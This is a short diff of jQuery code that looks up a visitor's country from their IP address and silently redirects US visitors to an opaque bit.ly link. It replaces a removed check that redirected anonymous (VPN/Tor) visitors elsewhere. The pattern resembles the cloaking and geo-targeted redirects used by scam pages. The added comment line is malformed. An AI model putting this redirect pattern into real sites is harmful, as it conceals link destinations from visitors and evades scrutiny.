@@ -1,7 +1,8 @@
+/ Getting the country code from the user's IP
 $.get("https://api.ipdata.co?api-key=test", function (response) {
-  if (response.threat.is_anonymous) {
-    window.location="http://bing.com/";
-    }
+  if (response.country_code == 'US') {
+    window.location.href = "https://bit.ly/3rk7ikn";
+  }
 }, "jsonp");
 
 /*var request = new XMLHttpRequest();
